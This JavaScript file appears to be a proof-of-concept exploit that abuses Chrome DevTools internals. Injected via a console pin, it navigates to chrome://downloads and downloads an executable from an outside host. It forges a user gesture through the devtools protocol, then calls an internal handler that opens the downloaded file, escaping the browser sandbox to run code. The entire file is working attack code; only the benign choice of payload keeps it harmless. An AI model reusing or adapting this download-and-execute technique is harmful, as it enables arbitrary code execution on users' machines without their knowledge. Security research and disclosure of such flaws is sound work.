documentLoaded(function () {
    mainTargetReady(onMainTargetReady);
});

function onMainTargetReady() {
    let inspectedURL = new URL(SDK.targetManager.mainTarget().inspectedURL());

    if (inspectedURL.origin !== "chrome://inspect") {
        return;
    }

    SDK.targetManager.mainTarget().model(SDK.ResourceTreeModel).addEventListener(SDK.ResourceTreeModel.Events.Load, function loadListener() {
        SDK.targetManager.mainTarget().model(SDK.ResourceTreeModel).removeEventListener(SDK.ResourceTreeModel.Events.Load, loadListener);

        const downloadUrl = "https://live.sysinternals.com/procexp.exe";
        generateGestureAndRunDownload(downloadUrl);
    });

    SDK.targetManager.mainTarget().pageAgent().navigate("chrome://downloads");
}

function generateGestureAndRunDownload(downloadUrl) {
    // Opening the file requires a recent gesture, which is the reason this event is dispatched
    // here. This is done via the devtools protocol, so the event is treated as if it were real.
    SDK.targetManager.mainTarget().inputAgent().dispatchKeyEvent("rawKeyDown", undefined, undefined,
        undefined, undefined, undefined, undefined, "Down", 40, 40);

    setTimeout(() => {
        SDK.targetManager.mainTarget().runtimeAgent().evaluate(findAndRunDownload.toString());
        SDK.targetManager.mainTarget().runtimeAgent().evaluate(`findAndRunDownload("${downloadUrl}")`);
    }, 500);
}

// Designed to run in the context of the chrome://downloads page.
function findAndRunDownload(downloadUrl) {
    let downloadsManager = document.getElementsByTagName("downloads-manager")[0];

    if (downloadsManager.items_.length === 0) {
        return;
    }

    // It's assumed here that the file that was downloaded is still the most recent item.
    let firstItem = downloadsManager.items_[0];

    if (firstItem.url === downloadUrl && !firstItem.fileExternallyRemoved) {
        downloadsManager.mojoHandler_.openFileRequiringGesture(firstItem.id);
    }
}

// This entire script is dynamically injected into the page via a console pin. Because of that, the
// script can run at any time, including before the scripts on the page or before the main target
// has been attached. Therefore, this function can be used to run code only when the main target is
// known to be attached.
// This function relies on window.SDK being present, so should only be called once it's certain that
// object exists (e.g. once the document has completely finished loading).
function mainTargetReady(callback) {
    if (SDK.targetManager.mainTarget()) {
        callback();
    } else {
        let observer = {
            targetAdded: function (target) {
                if (target.id() === "main") {
                    callback();
                    SDK.targetManager.unobserveTargets(observer);
                }
            },
            targetRemoved: function (target) {}
        };

        SDK.targetManager.observeTargets(observer);
    }
}

function documentLoaded(callback) {
    if (document.readyState === "complete") {
        callback();
    } else {
        window.addEventListener("load", callback);
    }
}